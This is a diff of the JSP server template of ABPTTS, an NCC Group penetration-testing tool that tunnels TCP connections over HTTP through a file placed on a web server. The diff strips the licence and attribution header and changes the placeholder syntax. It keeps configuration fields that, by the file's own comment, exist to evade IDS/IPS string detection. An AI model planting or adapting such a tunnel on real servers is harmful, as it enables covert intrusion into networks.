@@ -1,62 +1,4 @@
-<%
-/*
-
-	This file is part of A Black Path Toward The Sun ("ABPTTS")
-
-	Copyright 2016 NCC Group
-
-	A Black Path Toward The Sun ("ABPTTS") is free software: you can redistribute it and/or modify
-	it under the terms of version 2 of the GNU General Public License as published by
-	the Free Software Foundation.
-
-	A Black Path Toward The Sun ("ABPTTS") is distributed in the hope that it will be useful,
-	but WITHOUT ANY WARRANTY; without even the implied warranty of
-	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
-	GNU General Public License for more details.
-
-	You should have received a copy of the GNU General Public License
-	along with A Black Path Toward The Sun ("ABPTTS") (in the file license.txt).
-	If not, see <http://www.gnu.org/licenses/>.
-
-	Version 1.0
-	Ben Lincoln, NCC Group
-	2016-07-30
-
-	A Black Path Toward The Sun server component template file (JSP)
-	
-	Tested successfully on:
-	
-		Apache Tomcat
-			3.3.2 (Oracle JRE 1.5.0_22 / Windows 7 / x86-64 / VMWare Fusion)
-		
-			4.1.40 (Oracle JRE 1.5.0_22 / Windows 7 / x86-64 / VMWare Fusion)
-
-			5.5.36 (Oracle JRE 1.5.0_22 / Windows 7 / x86-64 / VMWare Fusion)
-		
-			6.0.0 (Oracle JRE 1.6.0_13-b03 / OpenSolaris 9 5.11 / x86 / VMWare Fusion)
-		
-			6.0.24-45.el6 (OpenJDK 1.6.0_24 / CentOS 6.3 / x86-64 / VMWare Fusion)
-			
-			6.0.45 (Oracle JRE 1.8.0_91-b15 / Windows 7 / x86-64 / VMWare Fusion)
-
-			7.0.70 (Oracle JRE 1.8.0_91-b15 / Windows 7 / x86-64 / VMWare Fusion)
-
-			8.0.14-1 (OpenJDK 1.7.0_79 / Debian 8 / x86-64 / VMWare Fusion)
-			
-			8.0.14-1 (OpenJDK 1.7.0_79 / Debian 8 / x86-64 / VirtualBox)
-
-		IBM WebSphere Application Server
-			8.5.5.0 gm1319.01 (IBM J9 VM (build 2.6, JRE 1.6.0 Windows 8 amd64-64) / Windows 10 / x86-64 / VMWare Fusion)
-		
-		JBoss
-			5.1.0.GA (gij (GNU libgcj) 4.1.2 20080704 (Red Hat 4.1.2-52) / CentOS 5.8 / x86-64 / VMWare Fusion)
-
-		Jetty
-			9.3.6.v20151106 (Oracle JRE 1.8.0_71-b15 / Debian 8 / x86-64 / VMWare Fusion)
-	
-*/
-
-%><%@page import="java.io.*,java.net.*,java.util.*,sun.misc.BASE64Decoder,sun.misc.BASE64Encoder,javax.naming.*,javax.servlet.jsp.PageContext,java.security.*,javax.crypto.*,javax.crypto.spec.*"%><%!
+<%@page import="java.io.*,java.net.*,java.util.*,sun.misc.BASE64Decoder,sun.misc.BASE64Encoder,javax.naming.*,javax.servlet.jsp.PageContext,java.security.*,javax.crypto.*,javax.crypto.spec.*"%><%!
 
 final public static char[] hexArray = "0123456789ABCDEF".toCharArray();
 
@@ -197,57 +139,57 @@ public byte[] DecryptData(byte[] cipherText, Cipher c, byte[] key, int blockSize
 
 /* Begin configurable options */
 
-int serverSocketMaxUnusedIterations = %PLACEHOLDER_serverSocketMaxUnusedIterations%;
+int serverSocketMaxUnusedIterations = |PLACEHOLDER_serverSocketMaxUnusedIterations|;
 
-int serverSocketIOTimeout = %PLACEHOLDER_serverSocketIOTimeout%;
-int serverSocketSendBufferSize = %PLACEHOLDER_serverSocketSendBufferSize%;
-int serverSocketReceiveBufferSize = %PLACEHOLDER_serverSocketReceiveBufferSize%;
+int serverSocketIOTimeout = |PLACEHOLDER_serverSocketIOTimeout|;
+int serverSocketSendBufferSize = |PLACEHOLDER_serverSocketSendBufferSize|;
+int serverSocketReceiveBufferSize = |PLACEHOLDER_serverSocketReceiveBufferSize|;
 
-int serverToClientBlockSize = %PLACEHOLDER_serverToClientBlockSize%;
+int serverToClientBlockSize = |PLACEHOLDER_serverToClientBlockSize|;
 
 /* Most of the options in this section are configurable to avoid simplistic string-based IDS/IPS-type detection */
 /* If they are altered, be sure to pass the corresponding alternate values to the Python client software */
 
-String headerValueKey = "%PLACEHOLDER_headerValueKey%";
-String encryptionKeyHex = "%PLACEHOLDER_encryptionKeyHex%";
+String headerValueKey = "|PLACEHOLDER_headerValueKey|";
+String encryptionKeyHex = "|PLACEHOLDER_encryptionKeyHex|";
 
-String headerNameKey = "%PLACEHOLDER_headerNameKey%";
+String headerNameKey = "|PLACEHOLDER_headerNameKey|";
 
-String accessKeyMode = "%PLACEHOLDER_accessKeyMode%";
-String paramNameAccessKey = "%PLACEHOLDER_paramNameAccessKey%";
+String accessKeyMode = "|PLACEHOLDER_accessKeyMode|";
+String paramNameAccessKey = "|PLACEHOLDER_paramNameAccessKey|";
 
-String paramNameOperation = "%PLACEHOLDER_paramNameOperation%";
-String paramNameDestinationHost = "%PLACEHOLDER_paramNameDestinationHost%";
-String paramNameDestinationPort = "%PLACEHOLDER_paramNameDestinationPort%";
-String paramNameConnectionID = "%PLACEHOLDER_paramNameConnectionID%";
-String paramNameData = "%PLACEHOLDER_paramNameData%";
-String paramNamePlaintextBlock = "%PLACEHOLDER_paramNamePlaintextBlock%";
-String paramNameEncryptedBlock = "%PLACEHOLDER_paramNameEncryptedBlock%";
+String paramNameOperation = "|PLACEHOLDER_paramNameOperation|";
+String paramNameDestinationHost = "|PLACEHOLDER_paramNameDestinationHost|";
+String paramNameDestinationPort = "|PLACEHOLDER_paramNameDestinationPort|";
+String paramNameConnectionID = "|PLACEHOLDER_paramNameConnectionID|";
+String paramNameData = "|PLACEHOLDER_paramNameData|";
+String paramNamePlaintextBlock = "|PLACEHOLDER_paramNamePlaintextBlock|";
+String paramNameEncryptedBlock = "|PLACEHOLDER_paramNameEncryptedBlock|";
 
-String dataBlockNameValueSeparatorB64 = "%PLACEHOLDER_dataBlockNameValueSeparatorB64%";
-String dataBlockParamSeparatorB64 = "%PLACEHOLDER_dataBlockParamSeparatorB64%";
+String dataBlockNameValueSeparatorB64 = "|PLACEHOLDER_dataBlockNameValueSeparatorB64|";
+String dataBlockParamSeparatorB64 = "|PLACEHOLDER_dataBlockParamSeparatorB64|";
 
-String opModeStringOpenConnection = "%PLACEHOLDER_opModeStringOpenConnection%";
-String opModeStringSendReceive = "%PLACEHOLDER_opModeStringSendReceive%";
-String opModeStringCloseConnection = "%PLACEHOLDER_opModeStringCloseConnection%";
+String opModeStringOpenConnection = "|PLACEHOLDER_opModeStringOpenConnection|";
+String opModeStringSendReceive = "|PLACEHOLDER_opModeStringSendReceive|";
+String opModeStringCloseConnection = "|PLACEHOLDER_opModeStringCloseConnection|";
 
-String responseStringHide = "%PLACEHOLDER_responseStringHide%";
-String responseStringConnectionCreated = "%PLACEHOLDER_responseStringConnectionCreated%";
-String responseStringConnectionClosed = "%PLACEHOLDER_responseStringConnectionClosed%";
-String responseStringData = "%PLACEHOLDER_responseStringData%";
-String responseStringNoData = "%PLACEHOLDER_responseStringNoData%";
-String responseStringErrorGeneric = "%PLACEHOLDER_responseStringErrorGeneric%";
-String responseStringErrorInvalidRequest = "%PLACEHOLDER_responseStringErrorInvalidRequest%";
-String responseStringErrorConnectionNotFound = "%PLACEHOLDER_responseStringErrorConnectionNotFound%";
-String responseStringErrorConnectionOpenFailed = "%PLACEHOLDER_responseStringErrorConnectionOpenFailed%";
-String responseStringErrorConnectionCloseFailed = "%PLACEHOLDER_responseStringErrorConnectionCloseFailed%";
-String responseStringErrorConnectionSendFailed = "%PLACEHOLDER_responseStringErrorConnectionSendFailed%";
-String responseStringErrorConnectionReceiveFailed = "%PLACEHOLDER_responseStringErrorConnectionReceiveFailed%";
-String responseStringErrorDecryptFailed = "%PLACEHOLDER_responseStringErrorDecryptFailed%";
-String responseStringErrorEncryptFailed = "%PLACEHOLDER_responseStringErrorEncryptFailed%";
-String responseStringErrorEncryptionNotSupported = "%PLACEHOLDER_responseStringErrorEncryptionNotSupported%";
-String responseStringPrefixB64 = "%PLACEHOLDER_responseStringPrefixB64%";
-String responseStringSuffixB64 = "%PLACEHOLDER_responseStringSuffixB64%";
+String responseStringHide = "|PLACEHOLDER_responseStringHide|";
+String responseStringConnectionCreated = "|PLACEHOLDER_responseStringConnectionCreated|";
+String responseStringConnectionClosed = "|PLACEHOLDER_responseStringConnectionClosed|";
+String responseStringData = "|PLACEHOLDER_responseStringData|";
+String responseStringNoData = "|PLACEHOLDER_responseStringNoData|";
+String responseStringErrorGeneric = "|PLACEHOLDER_responseStringErrorGeneric|";
+String responseStringErrorInvalidRequest = "|PLACEHOLDER_responseStringErrorInvalidRequest|";
+String responseStringErrorConnectionNotFound = "|PLACEHOLDER_responseStringErrorConnectionNotFound|";
+String responseStringErrorConnectionOpenFailed = "|PLACEHOLDER_responseStringErrorConnectionOpenFailed|";
+String responseStringErrorConnectionCloseFailed = "|PLACEHOLDER_responseStringErrorConnectionCloseFailed|";
+String responseStringErrorConnectionSendFailed = "|PLACEHOLDER_responseStringErrorConnectionSendFailed|";
+String responseStringErrorConnectionReceiveFailed = "|PLACEHOLDER_responseStringErrorConnectionReceiveFailed|";
+String responseStringErrorDecryptFailed = "|PLACEHOLDER_responseStringErrorDecryptFailed|";
+String responseStringErrorEncryptFailed = "|PLACEHOLDER_responseStringErrorEncryptFailed|";
+String responseStringErrorEncryptionNotSupported = "|PLACEHOLDER_responseStringErrorEncryptionNotSupported|";
+String responseStringPrefixB64 = "|PLACEHOLDER_responseStringPrefixB64|";
+String responseStringSuffixB64 = "|PLACEHOLDER_responseStringSuffixB64|";
 
 /* End configurable options */
 
